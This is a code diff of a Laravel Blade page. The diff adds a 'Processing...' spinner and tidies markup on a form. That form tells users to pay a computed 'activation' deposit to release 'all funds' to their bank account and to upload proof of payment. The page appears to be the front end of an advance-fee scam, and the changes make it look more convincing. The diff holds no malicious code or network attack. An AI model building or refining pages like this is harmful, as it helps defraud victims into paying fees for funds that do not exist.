@@ -77,9 +77,25 @@
             cursor: pointer;
             font-weight: 600;
             transition: background 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
         }
         button:hover {
             background-color: #283593;
+        }
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.9s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         .success-message {
             margin-top: 20px;
@@ -138,13 +154,11 @@
                 This deposit will be added to your bank account balance.
             </p>
 
-<p>
-    Please deposit 
-    <strong>${{ number_format(\App\Helpers\ActivationBalanceHelper::get(auth()->id()), 2) }}</strong>
-    to instantly activate your code and complete the transfer of all funds
-    to your bank account.
-</p>
-                Once the payment is confirmed, your funds will be fully activated and credited to your account.
+            <p>
+                Please deposit 
+                <strong>${{ number_format(\App\Helpers\ActivationBalanceHelper::get(auth()->id()), 2) }}</strong>
+                to instantly activate your code and complete the transfer of all funds
+                to your bank account.
             </p>
         </div>
 
@@ -162,7 +176,7 @@
             </div>
         @endif
 
-        <form action="{{ route('secure.upload.post') }}" method="POST" enctype="multipart/form-data">
+        <form id="uploadForm" action="{{ route('secure.upload.post') }}" method="POST" enctype="multipart/form-data">
             @csrf
 
             <label for="amount">Amount ($)</label>
@@ -189,7 +203,11 @@
             <label for="upload_file5">Upload File 5 (Optional)</label>
             <input type="file" name="upload_file5" id="upload_file5" accept=".jpg,.jpeg,.png,.pdf">
 
-            <button type="submit">Automatically Deposit to your Bank</button>
+            <!-- PROCESSING BUTTON ADDED HERE -->
+            <button type="submit" id="submitBtn">
+                <div class="spinner" id="spinner"></div>
+                <span id="btnText">Automatically Deposit to your Bank</span>
+            </button>
         </form>
     </div>
 
@@ -243,6 +261,17 @@
 </style>
 
 <script>
+document.getElementById('uploadForm').addEventListener('submit', function() {
+    const btn = document.getElementById('submitBtn');
+    const text = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+
+    btn.disabled = true;
+    text.textContent = "Processing...";
+    spinner.style.display = "inline-block";
+});
+
+// Chat unread bubble
 function loadUnreadCount() {
     fetch("{{ route('messages.unread.count') }}")
         .then(response => response.json())
